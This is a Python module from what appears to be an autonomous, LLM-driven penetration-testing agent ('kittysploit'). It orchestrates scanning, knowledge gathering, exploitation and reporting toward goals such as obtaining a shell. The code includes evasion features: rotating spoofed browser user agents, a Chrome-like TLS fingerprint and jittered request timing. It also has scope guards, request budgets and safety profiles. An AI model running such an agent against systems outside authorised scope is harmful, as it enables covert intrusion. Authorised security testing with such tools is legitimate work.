#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Agent workflow implementation (scan, knowledge, exploit, reasoning)."""

import ast
import asyncio
import ipaddress
import json
import os
import random
import re
import socket

import ssl
import random
import time
import urllib.request
import urllib.error
import urllib.parse
from datetime import datetime
from typing import Any, Dict, List, Optional, Tuple

try:
    import aiohttp
    HAS_AIOHTTP = True
except Exception:
    aiohttp = None
    HAS_AIOHTTP = False

from interfaces.command_system.builtin.agent.state import (
    AgentState,
    agent_state_checkpoint_dict,
    agent_state_from_dict,
    agent_state_to_dict,
)
from core.scanner.result_dedup import deduplicate_scanner_results
from core.playbooks.coverage import invalidate_playbook_planner_cache
from core.playbooks.executor import (
    build_playbook_execution_plan,
    merge_playbook_into_execution_plan,
    record_playbook_execution,
)
from interfaces.command_system.builtin.agent.strategic_llm_policy import (
    llm_budget_exhausted,
    llm_budget_remaining,
    resolve_effective_llm_budget,
    resolve_llm_model,
    should_force_strategic_llm,
    strategic_llm_context,
    strategic_llm_instruction_extension,
)
from interfaces.command_system.builtin.agent.planning_service import (
    PlanningService,
    build_reason_prompt_payload,
)

from interfaces.command_system.builtin.scanner_command import ScannerCommand
from core.output_handler import (
    print_error,
    print_info,
    print_status,
    print_success,
    print_warning,
    set_thread_output_quiet,
)

try:
    from langgraph.graph import END, StateGraph
    HAS_LANGGRAPH = True
except ImportError:
    HAS_LANGGRAPH = False
    END = "__end__"
    StateGraph = None

from interfaces.command_system.builtin.agent.agent_constants import (
    AUTH_FIRST_DEPRIORITIZE_SUBSTRINGS,
    AUTH_PATH_MARKERS,
    CAMPAIGN_GOAL_EXPLOIT,
    CAMPAIGN_GOAL_OBTAIN_AUTH,
    CAMPAIGN_GOAL_OBTAIN_SHELL,
    CAMPAIGN_GOAL_POST_AUTH,
    CAMPAIGN_GOAL_RECON,
    CAMPAIGN_GOAL_SHELL_STOP,
    CLIENT_JS_INTEL_MODULES,
    CMS_HINT_TOKENS,
    CMS_LOCK_NAMES,
    CMS_SPECIALIZATION_BLOB_TOKENS,
    DEFAULT_AGENT_USER_AGENT,
    DISALLOWED_POST_AUTH_TOKENS,
    DISCREET_PROFILE_BLOCKED_MODULE_SUBSTRINGS,
    DISCREET_PROFILE_EXPENSIVE_MODULE_SUBSTRINGS,
    DRUPAL_BLOB_MARKERS,
    DERIVED_HOST_SCAN_MAX_HOSTS,
    DERIVED_HOST_SCAN_MODULES_PER_HOST,
    DERIVED_HOST_LIVE_STATUSES,
    DERIVED_HOST_PROBE_PATHS,
    DVWA_BLOB_MARKERS,
    EXPANDED_SURFACE_INTEL_MAX_MODULES,
    EXPANDED_SURFACE_MODULE_PREFIXES,
    EXPANDED_SURFACE_RECON_SKIP_SUBSTR,
    HTTP_REDIRECT_STATUSES,
    HTTP_SQLI_POST_MODULE,
    HTTP_SQLI_SCANNER_MODULE,
    HTTP_SQLI_SCANNER_MODULE_LEGACY,
    HTTP_STATUS_RISK_SIGNALS,
    JOOMLA_BLOB_MARKERS,
    NEGATIVE_EVIDENCE_MARKERS,
    NEXTJS_HINT_TOKENS,
    POSITIVE_EVIDENCE_MARKERS,
    POSITIVE_SCAN_MESSAGE_MARKERS,
    SAFE_PROFILE_BLOCKED_MODULE_SUBSTRINGS,
    SAFE_FOLLOWUP_ACTION_TYPES,
    SHELL_HUNTER_MACRO_MAX_ROUNDS,
    WAF_BODY_MARKERS,
    WAF_RISK_HTTP_STATUS_CODES,
    WORDPRESS_BODY_FINGERPRINT_TOKENS,
    WORDPRESS_FORM_FIELD_TOKENS,
    WORDPRESS_LANDING_PATH_MARKERS,
)
from interfaces.command_system.builtin.agent.waf_signals import (
    approved_to_continue_through_waf,
    is_actionable_waf_signal,
)
from interfaces.command_system.builtin.agent.target_resolver import TargetResolver
from interfaces.command_system.builtin.agent.module_catalog import ModuleCatalogService
from interfaces.command_system.builtin.agent.local_llm import LocalLLMService
from interfaces.command_system.builtin.agent.report_service import ReportService
from interfaces.command_system.builtin.agent.http_intelligence import (
    HttpRequestIntelligence,
    resolve_active_probe_paths,
)
from interfaces.command_system.builtin.agent.post_exploit_intelligence import PostExploitIntelligence
from interfaces.command_system.builtin.agent.auth_operations import AuthContextOperations
from interfaces.command_system.builtin.agent.identity_intel import (
    build_intel_option_overrides,
    build_persona_password_candidates,
    build_username_candidates,
    harvest_identities_from_results,
    harvest_subdomains_from_results,
    merge_intel_into_knowledge_base,
    merge_osint_synthesis_into_knowledge_base,
    organization_root_domain,
    pick_intel_modules,
    run_agent_intel_pipeline,
)
from core.osint.evidence import OsintEvidenceCollector
from core.osint.opsec import OsintOpsecJournal
from core.osint.persist import write_osint_evidence_bundle
from core.osint.password_profiling import harvest_password_candidates_from_results
from interfaces.command_system.builtin.agent.attack_chain_memory import (
    export_chain_summary,
    poison_kb_from_results,
    suggest_chain_module_paths,
)
from interfaces.command_system.builtin.agent.chain_context import (
    apply_chain_module_options,
    build_chain_context_option_overrides,
    sync_chain_context_to_kb,
)
from interfaces.command_system.builtin.agent.goal_planner import (
    is_shell_operator_goal,
    kb_api_surface_ready,
    kb_client_js_surface_ready,
    kb_ssh_surface_ready,
    kb_subdomain_surface_expandable,
    operator_goal_from_mapping,
    path_matches_forced_protocol,
    prioritize_subdomain_hosts,
    suggest_shell_plan_followups,
)
from interfaces.command_system.builtin.agent.io_utils import atomic_write_json, load_json_dict
from interfaces.command_system.builtin.agent.module_scoring import (
    ModuleScoreRules,
    estimate_network_cost,
    information_score_kb,
    module_blob_lower,
    module_path_lower,
    score_rules,
    score_tech_hints_in_blob,
)
from interfaces.command_system.builtin.agent.crawler_intelligence import (
    BRUTEFORCE_MODULE_PATH,
    merge_crawler_overrides,
)
from interfaces.command_system.builtin.agent.campaign_utility import (
    module_utility,
    select_opportunistic_batch,
    unified_module_score,
)
from interfaces.command_system.builtin.agent.attack_branch import (
    action_type_for_module_path,
    goal_allows_sqli_deep_resume,
    has_sqli_shell_pressure,
    module_allowed_despite_observed,
    parked_sqli_branches,
    pick_light_sqli_probe,
    pick_resumed_deep_action,
    sync_branches_from_kb_signals,
    sync_branches_from_results,
)
from interfaces.command_system.builtin.agent.campaign_continuation import (
    list_shell_continuation_pivots,
    should_defer_shell_low_novelty_stop,
)
from interfaces.command_system.builtin.agent.campaign_knowledge_graph import sync_attack_graph_from_kb
from interfaces.command_system.builtin.agent.decision_report import build_action_decision_report
from interfaces.command_system.builtin.agent.evidence import attach_result_evidence
from interfaces.command_system.builtin.agent.evidence_gate import apply_evidence_gate
from interfaces.command_system.builtin.agent.module_context_memory import (
    ModuleContextMemory,
    classify_operational_context,
)
from interfaces.command_system.builtin.agent.module_performance_memory import (
    ModulePerformanceMemory,
    classify_target_profile,
    kb_light_copy,
)
from interfaces.command_system.builtin.agent.module_health_memory import ModuleHealthMemory
from interfaces.command_system.builtin.agent.learning_store import LearningStore
from interfaces.command_system.builtin.agent.compiled_patterns import (
    ABSOLUTE_URL_RE,
    ACRONYM_RE,
    COMMA_SEMICOLON_SPLIT_RE,
    ENDPOINT_RE,
    HTTP_STATUS_IN_TEXT_RE,
    LOGIN_PAGE_PATH_IN_MESSAGE_RE,
    PARAM_RE,
    POST_AUTH_WORD_RE,
    SCRIPT_RE,
    STYLE_RE,
    TAG_RE,
    WORD_RE,
)
from interfaces.command_system.builtin.agent.network_budget import (
    NetworkBudgetExceeded,
    consume_network_request,
    install_requests_budget_hook,
    module_budget_units,
    network_budget_context,
    sync_metrics_from_budget,
    try_consume_budget,
)
from interfaces.command_system.builtin.agent.redaction import sanitize_nested
from interfaces.command_system.builtin.agent.run_lifecycle import RunLifecycle
from interfaces.command_system.builtin.agent.runtime_policy import (
    assess_module_risk,
    evaluate_module_catalog_policy,
    runtime_policy_context,
)
from interfaces.command_system.builtin.agent.ot_policy import (
    merge_ot_context_from_results,
)
from interfaces.command_system.builtin.agent.execution_service import AgentModuleExecutionService
from interfaces.command_system.builtin.agent.module_runner import (
    AgentModuleRunner,
    WorkflowModuleRunnerHooks,
)


class AgentWorkflowCore:
    """Orchestrates autonomous scan → analyze → reason → exploit → report."""

    def __init__(self, framework):
        self.framework = framework
        self._catalog = ModuleCatalogService(framework)
        self._target_resolver = TargetResolver()
        self._llm = LocalLLMService(api_key=os.environ.get("KITTYMCP_OLLAMA_API_KEY"))
        self._planner = PlanningService(self._llm)
        self._report = ReportService()
        self._http_intel = HttpRequestIntelligence(framework)
        self._http_intel._llm = self._llm
        self._post_intel = PostExploitIntelligence(framework)
        self._auth_ops = AuthContextOperations(self._normalize_relative_path)
        self._module_perf = ModulePerformanceMemory()
        self._module_health = ModuleHealthMemory()
        self._module_ctx = ModuleContextMemory()
        self._learning = LearningStore()
        self._lifecycle = RunLifecycle()
        self._module_runner = AgentModuleRunner(WorkflowModuleRunnerHooks(self))
        self._module_executor = AgentModuleExecutionService(framework)
        self._paths = None

    def _memory_path(self, filename: str) -> str:
        if self._paths is not None:
            self._paths.ensure()
            return str(self._paths.memory_dir / filename)
        return os.path.expanduser(f"~/.kittysploit/agent/default/memory/{filename}")

    def _record_agent_error(
        self,
        state: AgentState,
        component: str,
        exc: Any,
        *,
        fatal: bool = False,
        phase: str = "",
    ) -> None:
        self._lifecycle.record_error(
            state,
            component,
            exc,
            fatal=fatal,
            phase=phase,
            append_timeline=self._append_timeline_event,
        )

    def _checkpoint_state(self, state: AgentState, phase: str) -> None:
        self._lifecycle.checkpoint_state(state, phase)

    def _phase_stop_reason(self, state: AgentState, phase: str) -> Optional[str]:
        return self._lifecycle.phase_stop_reason(state, phase)

    def _network_error_markers(self) -> Tuple[str, ...]:
        return (
            "connection refused",
            "failed to establish a new connection",
            "max retries exceeded",
            "name or service not known",
            "temporary failure in name resolution",
            "nodename nor servname provided",
            "network is unreachable",
            "no route to host",
            "target is not reachable",
            "target not reachable",
            "connection timeout",
            "read timed out",
            "connect timeout",
            "connection aborted",
            "remote end closed connection",
        )

    def _agent_user_agent(self, state: AgentState) -> str:
        value = str(getattr(state, "user_agent", "") or "").strip()
        if value:
            return value
        
        # Spoofed user agents list
        chrome_uas = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        ]
        return random.choice(chrome_uas)


    def _create_spoofed_ssl_context(self, state: Optional[AgentState] = None) -> Any:
        policy = getattr(state, "runtime_policy", None) if state is not None else None
        if policy is not None and not getattr(policy, "tls_verify", True):
            ctx = ssl._create_unverified_context()
        else:
            cafile = getattr(policy, "tls_ca_bundle", None) if policy is not None else None
            ctx = ssl.create_default_context(cafile=cafile)
        # Chrome JA3-like ciphers
        ctx.set_ciphers('TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA')
        try:
            ctx.set_ecdh_curve('prime256v1')
        except Exception:
            pass
        return ctx

    def _agent_http_headers(self, state: AgentState) -> Dict[str, str]:
        return {"User-Agent": self._agent_user_agent(state)}

    async def _async_http_probe_one(
        self,
        state: AgentState,
        session: Any,
        url: str,
        timeout_s: float,
        read_bytes: int,
    ) -> Dict[str, Any]:
        try:
            guard = getattr(state, "scope_guard", None)
            if guard is not None:
                allowed, reason = guard.validate_url(url)
                if not allowed:
                    return {"url": url, "status": 0, "headers": {}, "body": "", "final_url": "", "error": reason}
            async with session.get(url, timeout=timeout_s, allow_redirects=False) as response:
                raw = await response.content.read(read_bytes)
                return {
                    "url": url,
                    "status": int(response.status or 0),
                    "headers": {str(k).lower(): str(v) for k, v in response.headers.items()},
                    "body": raw.decode("utf-8", errors="ignore"),
                    "final_url": str(response.url),
                    "error": "",
                }
        except Exception as exc:
            return {"url": url, "status": 0, "headers": {}, "body": "", "final_url": "", "error": str(exc)}

    async def _async_http_probe_many(
        self,
        state: AgentState,
        urls: List[str],
        timeout_s: float = 4.0,
        read_bytes: int = 8192,
    ) -> List[Dict[str, Any]]:
        timeout = aiohttp.ClientTimeout(total=timeout_s) if HAS_AIOHTTP else None
        headers = self._agent_http_headers(state)
        policy = getattr(state, "runtime_policy", None)
        connector = None
        if policy is not None:
            connector = aiohttp.TCPConnector(
                ssl=self._create_spoofed_ssl_context(state)
                if getattr(policy, "tls_verify", True)
                else False
            )
        async with aiohttp.ClientSession(headers=headers, timeout=timeout, connector=connector) as session:
            tasks = [self._async_http_probe_one(state, session, url, timeout_s, read_bytes) for url in urls]
            return list(await asyncio.gather(*tasks))

    def _run_async_http_probe_many(
        self,
        state: AgentState,
        urls: List[str],
        timeout_s: float = 4.0,
        read_bytes: int = 8192,
    ) -> Optional[List[Dict[str, Any]]]:
        if not getattr(state, "async_probes", False) or not HAS_AIOHTTP or not urls:
            return None
        try:
            return asyncio.run(self._async_http_probe_many(state, urls, timeout_s, read_bytes))
        except RuntimeError:
            loop = asyncio.new_event_loop()
            try:
                return loop.run_until_complete(self._async_http_probe_many(state, urls, timeout_s, read_bytes))
            finally:
                loop.close()
        except Exception as exc:
            if getattr(state, "verbose", False):
                print_warning(f"Async probe failed, falling back to urllib: {exc}")
            return None

    def _sync_http_probe_one(
        self,
        state: AgentState,
        url: str,
        timeout_s: float = 4.0,
        read_bytes: int = 8192,
    ) -> Dict[str, Any]:
        request = urllib.request.Request(
            url,
            headers=self._agent_http_headers(state),
            method="GET",
        )
        try:
            guard = getattr(state, "scope_guard", None)
            if guard is not None:
                allowed, reason = guard.validate_url(url)
                if not allowed:
                    raise PermissionError(reason)
            consume_network_request(f"GET {url}")

            class _NoRedirect(urllib.request.HTTPRedirectHandler):
                def redirect_request(self, req, fp, code, msg, headers, newurl):
                    return None

            handlers = [_NoRedirect()]
            if url.startswith("https://"):
                ctx = self._create_spoofed_ssl_context(state)
                handlers.append(urllib.request.HTTPSHandler(context=ctx))
            opener = urllib.request.build_opener(*handlers)
            with opener.open(request, timeout=timeout_s) as response:
                body = response.read(read_bytes).decode("utf-8", errors="ignore")
                return {
                    "url": url,
                    "status": int(getattr(response, "status", 0) or response.getcode() or 0),
                    "headers": {k.lower(): str(v) for k, v in response.headers.items()},
                    "body": body,
                    "final_url": str(response.geturl() or ""),
                    "error": "",
                }
        except urllib.error.HTTPError as exc:
            try:
                body = exc.read(read_bytes).decode("utf-8", errors="ignore")
            except Exception:
                body = ""
            return {
                "url": url,
                "status": int(exc.code or 0),
                "headers": {k.lower(): str(v) for k, v in (exc.headers.items() if exc.headers else [])},
                "body": body,
                "final_url": str(getattr(exc, "url", "") or ""),
                "error": "",
            }
        except Exception as exc:
            return {"url": url, "status": 0, "headers": {}, "body": "", "final_url": "", "error": str(exc)}

    def _http_probe_many(
        self,
        state: AgentState,
        urls: List[str],
        timeout_s: float = 4.0,
        read_bytes: int = 8192,
    ) -> List[Dict[str, Any]]:
        if not urls:
            return []

        kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
        cache = kb.setdefault("http_probe_cache", {})
        key_to_url: Dict[str, str] = {}
        output_by_key: Dict[str, Dict[str, Any]] = {}
        ordered_keys: List[str] = []

        for raw_url in urls:
            key = self._normalize_probe_url(raw_url)
            ordered_keys.append(key)
            key_to_url.setdefault(key, raw_url)
            cached = cache.get(key) if isinstance(cache, dict) else None
            if isinstance(cached, dict):
                row = dict(cached)
                row["cached"] = True
                output_by_key[key] = row

        fetch_keys = [key for key in key_to_url.keys() if key not in output_by_key]
        fetch_urls = [key_to_url[key] for key in fetch_keys]
        if fetch_urls:
            remaining = self._request_budget_remaining(state)
            if remaining is not None:
                allowed_count = max(0, min(len(fetch_urls), remaining))
                skipped_urls = fetch_urls[allowed_count:]
                fetch_keys = fetch_keys[:allowed_count]
                fetch_urls = fetch_urls[:allowed_count]
                for skipped_url in skipped_urls:
                    key = self._normalize_probe_url(skipped_url)
                    budget = getattr(state, "network_budget", None)
                    if budget is not None:
                        budget.record_skipped(1)
                    else:
                        state.metrics.network_units_skipped += 1
                    output_by_key[key] = {
                        "url": skipped_url,
                        "status": 0,
                        "headers": {},
                        "body": "",
                        "final_url": "",
                        "error": "request budget exhausted before HTTP probe",
                    }

        fetched_rows: List[Dict[str, Any]] = []
        if fetch_urls:
            async_rows = self._run_async_http_probe_many(state, fetch_urls, timeout_s, read_bytes)
            if async_rows is not None:
                fetched_rows = async_rows
            else:
                for url in fetch_urls:
                    self._sleep_between_agent_actions(state, f"http-probe:{url}")
                    fetched_rows.append(self._sync_http_probe_one(state, url, timeout_s, read_bytes))

        for key, row in zip(fetch_keys, fetched_rows):
            normalized_row = dict(row)
            normalized_row["cached"] = False
            output_by_key[key] = normalized_row
            if isinstance(cache, dict) and not normalized_row.get("error"):
                cache[key] = {
                    "url": normalized_row.get("url"),
                    "status": normalized_row.get("status"),
                    "headers": normalized_row.get("headers") or {},
                    "body": str(normalized_row.get("body", "") or "")[:read_bytes],
                    "final_url": normalized_row.get("final_url") or "",
                    "error": "",
                }

        kb["http_probe_cache"] = cache
        state.knowledge_base = kb
        return [
            output_by_key.get(
                key,
                {"url": key_to_url.get(key, key), "status": 0, "headers": {}, "body": "", "final_url": "", "error": ""},
            )
            for key in ordered_keys
        ]

    def _normalized_safety_profile(self, state: AgentState) -> str:
        profile = str(getattr(state, "safety_profile", "normal") or "normal").strip().lower()
        if profile not in {"safe", "discreet", "normal", "aggressive"}:
            return "normal"
        return profile

    def _discreet_mode(self, state: AgentState) -> bool:
        return self._normalized_safety_profile(state) == "discreet"

    def _request_budget_remaining(self, state: AgentState) -> Optional[int]:
        budget = getattr(state, "network_budget", None)
        if budget is not None and budget.bounded:
            return budget.remaining
        try:
            limit = int(getattr(state, "request_budget", 0) or 0)
        except Exception:
            limit = 0
        if limit <= 0:
            return None
        used = int(getattr(state.metrics, "network_units_used", 0) or 0)
        return max(0, limit - used)

    def _consume_network_units(
        self,
        state: AgentState,
        units: int = 1,
        *,
        reason: str = "non-HTTP agent network operation",
        module: Any = None,
        module_path: str = "",
    ) -> bool:
        if module is not None or module_path:
            units = module_budget_units(module if module is not None else {"path": module_path}, module_path, units)
        return try_consume_budget(
            state,
            units,
            reason=reason,
            phase=state.current_phase,
        )

    @staticmethod
    def _module_uses_http_client(module: Any) -> bool:
        return AgentModuleRunner.module_uses_http_client(module)

    def _budget_skip_result(self, module: Dict[str, Any], phase_name: str) -> Dict[str, Any]:
        return self._module_runner.budget_skip_result(module, phase_name)

    def _limit_modules_by_request_budget(
        self,
        state: AgentState,
        modules: List[Dict[str, Any]],
        phase_name: str,
    ) -> Tuple[List[Dict[str, Any]], List[Dict[str, Any]]]:
        return self._module_runner.limit_modules_by_request_budget(state, modules, phase_name)

    def _elite_auto_correct_modules(
        self,
        state: AgentState,
        scanner: Any,
        batch_results: List[Dict[str, Any]],
        phase_name: str,
    ) -> None:
        if not getattr(state, "llm_local", False):
            return
        for res in batch_results:
            if res.get("status") == "error" and not res.get("vulnerable"):
                message = str(res.get("message", "")).lower()
                if "filter" not in message and "blocked" not in message:
                    continue
                module_path = res.get("path")
                print_status(f"Elite: Attempting auto-correction for failed module `{module_path}`...")
                try:
                    suggestion = self._llm.query_text(
                        state.llm_endpoint,
                        state.llm_model,
                        (
                            "Suggest one bounded, non-destructive parameter adjustment. "
                            "Do not suggest bypassing scope, approvals, authentication, or rate limits."
                        ),
                        {
                            "module": module_path,
                            "error": res.get("message"),
                        },
                    )
                    if not suggestion:
                        continue
                    print_info(f"LLM suggestion: {suggestion}")
                    res["auto_correction_attempted"] = True
                    res["llm_suggestion"] = suggestion
                except Exception as exc:
                    self._record_agent_error(state, "llm_auto_correction", exc, phase=phase_name)

    def _execute_agent_modules(
        self,
        state: AgentState,
        scanner,
        modules: List[Dict[str, Any]],
        target_info: Dict[str, Any],
        threads: int,
        verbose: bool,
        phase_name: str = "phase",
    ) -> List[Dict[str, Any]]:
        return self._module_runner.execute_agent_modules(
            state,
            scanner,
            modules,
            target_info,
            threads,
            verbose,
            phase_name,
            elite_auto_correct=lambda st, sc, rows: self._elite_auto_correct_modules(
                st, sc, rows, phase_name
            ),
        )

    def _normalize_probe_url(self, url: str) -> str:
        try:
            parsed = urllib.parse.urlsplit(str(url or "").strip())
            scheme = parsed.scheme.lower()
            host = (parsed.hostname or "").lower()
            port = parsed.port
            netloc = host
            if port and not ((scheme == "http" and port == 80) or (scheme == "https" and port == 443)):
                netloc = f"{host}:{port}"
            path = parsed.path or "/"
            query = f"?{parsed.query}" if parsed.query else ""
            return urllib.parse.urlunsplit((scheme, netloc, path, query, ""))
        except Exception:
            return str(url or "").strip()

    def _build_agent_http_request_url(self, state: AgentState, path_or_url: str) -> str:
        from interfaces.command_system.builtin.agent.http_probe_actions import build_agent_http_request_url

        return build_agent_http_request_url(state, path_or_url)

    def _execute_agent_http_request_action(self, state: AgentState, action: Dict[str, Any]) -> Dict[str, Any]:
        from interfaces.command_system.builtin.agent.http_probe_actions import execute_agent_http_request

        return execute_agent_http_request(
            state,
            action,
            headers=self._agent_http_headers(state),
            sleep_fn=lambda: self._sleep_between_agent_actions(
                state, f"llm-http:{str((action.get('options') or {}).get('method') or 'GET').upper()} {action.get('path')}"
            ),
            ssl_context_fn=lambda: self._create_spoofed_ssl_context(state),
            consume_network=lambda units, reason: self._consume_network_units(state, units, reason=reason),
        )

    def _execute_plan_http_requests(self, state: AgentState, actions: List[Dict[str, Any]], budget: int) -> List[Dict[str, Any]]:
        from interfaces.command_system.builtin.agent.http_probe_actions import (
            MAX_HTTP_REQUESTS_PER_TURN,
            execute_plan_http_requests,
        )

        selected_budget = max(0, min(int(budget or 0), MAX_HTTP_REQUESTS_PER_TURN))
        if selected_budget <= 0:
            return []
        http_count = sum(
            1 for action in actions
            if isinstance(action, dict) and str(action.get("type", "")).lower() == "http_request"
        )
        if http_count:
            print_status(f"Execution plan HTTP request: running up to {min(http_count, selected_budget)} request(s)")
        return execute_plan_http_requests(
            state,
            actions,
            selected_budget,
            headers=self._agent_http_headers(state),
            sleep_fn=lambda action: self._sleep_between_agent_actions(
                state,
                f"llm-http:{str((action.get('options') or {}).get('method') or 'GET').upper()} {action.get('path')}",
            ),
            ssl_context_fn=lambda: self._create_spoofed_ssl_context(state),
            consume_network=lambda units, reason: self._consume_network_units(state, units, reason=reason),
            max_per_turn=MAX_HTTP_REQUESTS_PER_TURN,
        )

    def _execute_plan_surface_scans(self, state: AgentState, actions: List[Dict[str, Any]], budget: int) -> List[Dict[str, Any]]:
        selected = [
            action for action in actions
            if isinstance(action, dict) and str(action.get("type", "")).lower() == "surface_scan"
        ]
        if not selected or budget <= 0:
            return []
        action = selected[0]
        options = self._sanitize_surface_scan_action_options(action.get("options", {}))
        limit = max(1, min(int(options.get("limit") or 6), int(budget or 1)))
        all_modules = self._catalog.discover_campaign_modules(
            expanded=bool(getattr(state, "expanded_surface", False))
        )
        modules = [
            module for module in self._select_modules_for_target(state, all_modules)
            if str(module.get("path", "")).startswith(("scanner/", "auxiliary/scanner/"))
        ]
        protocol = str(options.get("protocol") or getattr(state, "protocol", "") or "").strip().lower()
        if protocol:
            modules = self._filter_modules_by_protocol(modules, protocol=protocol)
        tags = options.get("tags") if isinstance(options.get("tags"), list) else []
        if tags:
            tag_set = {str(t).lower() for t in tags}
            modules = [
                module for module in modules
                if tag_set.intersection({str(t).lower() for t in module.get("tags", []) or []})
                or any(tag in str(module.get("path", "")).lower() for tag in tag_set)
            ]
        observed = {
            str(path).strip()
            for path in (state.knowledge_base or {}).get("observed_modules", [])
            if str(path).strip()
        }
        modules = [
            module for module in modules
            if str(module.get("path", "")).strip() not in observed
        ]
        if not modules:
            return []
        tech_hints = {
            str(x).lower()
            for x in (state.knowledge_base or {}).get("tech_hints", []) or []
        }
        selected_modules = self._select_modules_opportunistic(
            modules,
            state,
            tech_hints,
            observed,
            limit,
        ) or modules[:limit]
        if not selected_modules:
            return []
        print_status(
            f"Execution plan surface scan: running {len(selected_modules)} scanner module(s)"
        )
        scanner = state.scanner
        results = self._execute_agent_modules(
            state,
            scanner,
            selected_modules,
            state.target_info,
            1 if state.verbose or self._discreet_mode(state) else max(1, min(int(state.threads or 1), 4)),
            bool(state.verbose),
            "surface-scan",
        )
        selected_paths = [m.get("path") for m in selected_modules if m.get("path")]
        self._remember_planner_actions(
            state.knowledge_base,
            selected_paths,
            {
                str(row.get("path", "")).strip()
                for row in results
                if isinstance(row, dict) and str(row.get("status", "")).lower() in {"error", "skipped"}
            },
        )
        self._append_timeline_event(
            state,
            "surface-scan",
            f"LLM requested scanner -u style overview ({len(selected_modules)} module(s)).",
            modules=selected_modules,
            results=results,
        )
        return results

    def _action_delay_bounds(self, state: AgentState) -> Tuple[float, float]:
        try:
            delay_min = max(0.0, float(getattr(state, "request_delay_min", 0.0) or 0.0))
        except Exception:
            delay_min = 0.0
        try:
            delay_max = max(0.0, float(getattr(state, "request_delay_max", 0.0) or 0.0))
        except Exception:
            delay_max = 0.0
        if delay_max < delay_min:
            delay_max = delay_min
        return delay_min, delay_max

    def _throttle_active_web_probe(self, state: AgentState, path: str) -> None:
        """Per-request spacing for direct surface probes (avoids 10+ GET burst)."""
        delay_min, delay_max = self._action_delay_bounds(state)
        if delay_max <= 0:
            if self._discreet_mode(state):
                time.sleep(random.uniform(0.45, 0.95))
            else:
                time.sleep(random.uniform(0.25, 0.55))
            return
        self._sleep_between_agent_actions(state, f"active-probe:{path}")

    def _sleep_between_agent_actions(self, state: AgentState, context: str = "") -> None:
        delay_min, delay_max = self._action_delay_bounds(state)
        if delay_max <= 0:
            return
        delay = random.uniform(delay_min, delay_max)
        if delay <= 0:
            return
        if getattr(state, "verbose", False):
            suffix = f" before {context}" if context else ""
            print_info(f"Rate limit: sleeping {delay:.2f}s{suffix}")
        time.sleep(delay)

    def _module_block_reason_for_profile(
        self,
        state: AgentState,
        module_path: Any,
        module_info: Optional[Dict[str, Any]] = None,
    ) -> str:
        path = str(module_path or "")
        info = module_info if isinstance(module_info, dict) else {}
        if not info:
            try:
                info = dict(self._catalog._get_module_catalog().get(path) or {})
            except Exception:
                info = {}
        policy = getattr(state, "runtime_policy", None)
        if policy is None:
            return ""
        block = evaluate_module_catalog_policy(
            policy,
            info or {"path": path},
            path,
            phase=str(getattr(state, "current_phase", "") or "catalog"),
            knowledge_base=state.knowledge_base if isinstance(state.knowledge_base, dict) else {},
        )
        if block is not None:
            return block.reason
        return ""

    def _remember_policy_rejection(
        self,
        state: AgentState,
        module_path: str,
        reason: str,
        *,
        phase: str = "catalog",
        module_info: Optional[Dict[str, Any]] = None,
    ) -> None:
        if not reason or not isinstance(getattr(state, "knowledge_base", None), dict):
            return
        path = str(module_path or "").strip()
        if not path:
            return
        risk = assess_module_risk(module_info or {"path": path}, path)
        kb = state.knowledge_base
        rows = list(kb.get("policy_rejections") or [])
        row = {
            "phase": str(phase or getattr(state, "current_phase", "") or "catalog"),
            "path": path,
            "risk": risk.level,
            "reason": str(reason)[:260],
            "mission_profile": str(getattr(getattr(state, "runtime_policy", None), "mission_profile", "") or ""),
            "safety_profile": self._normalized_safety_profile(state),
        }
        key = (row["phase"], row["path"], row["reason"])
        existing = {
            (str(item.get("phase", "")), str(item.get("path", "")), str(item.get("reason", "")))
            for item in rows
            if isinstance(item, dict)
        }
        if key not in existing:
            rows.append(row)
        kb["policy_rejections"] = rows[-80:]

    def _filter_modules_for_safety_profile(
        self,
        state: AgentState,
        modules: List[Dict[str, Any]],
    ) -> Tuple[List[Dict[str, Any]], List[Dict[str, Any]]]:
        allowed: List[Dict[str, Any]] = []
        skipped: List[Dict[str, Any]] = []
        for module in modules or []:
            path = module.get("path") if isinstance(module, dict) else ""
            reason = self._module_block_reason_for_profile(state, path, module)
            if reason:
                self._remember_policy_rejection(
                    state,
                    str(path or ""),
                    reason,
                    phase="catalog",
                    module_info=module if isinstance(module, dict) else None,
                )
                skipped.append({
                    "module": module.get("name", path) if isinstance(module, dict) else str(path),
                    "path": path,
                    "status": "skipped",
                    "vulnerable": False,
                    "message": reason,
                    "details": {"safety_profile": self._normalized_safety_profile(state)},
                })
                continue
            allowed.append(module)
        if skipped and getattr(state, "verbose", False):
            print_warning(f"Safety profile skipped {len(skipped)} noisy module(s)")
        return allowed, skipped

    def _filter_catalog_candidates_for_policy(
        self,
        state: AgentState,
        modules: List[Dict[str, Any]],
        *,
        phase: str = "catalog",
    ) -> List[Dict[str, Any]]:
        if not modules:
            return []
        allowed: List[Dict[str, Any]] = []
        for module in modules:
            if not isinstance(module, dict):
                continue
            path = str(module.get("path", "") or "").strip()
            reason = self._module_block_reason_for_profile(state, path, module)
            if reason:
                self._remember_policy_rejection(
                    state,
                    path,
                    reason,
                    phase=phase,
                    module_info=module,
                )
                continue
            allowed.append(module)
        return allowed

